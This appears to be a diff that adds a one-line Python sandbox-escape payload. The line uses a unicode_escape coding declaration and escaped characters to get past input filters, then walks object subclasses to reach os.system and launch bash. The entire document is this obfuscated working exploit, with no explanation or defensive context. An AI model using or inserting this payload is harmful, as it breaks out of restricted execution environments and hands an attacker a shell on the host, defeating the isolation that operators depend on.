@@ -1,0 +1,1 @@
+#coding:unicode_escape\u000a[x for x in \u0028\u0029\u002e__class__\u002e__base__\u002e__subclasses__\u0028\u0029 if x\u002e__name__ \u003d\u003d "_wrap_close"][0]\u002eclose\u002e__globals__["system"]\u0028"bash"\u0029
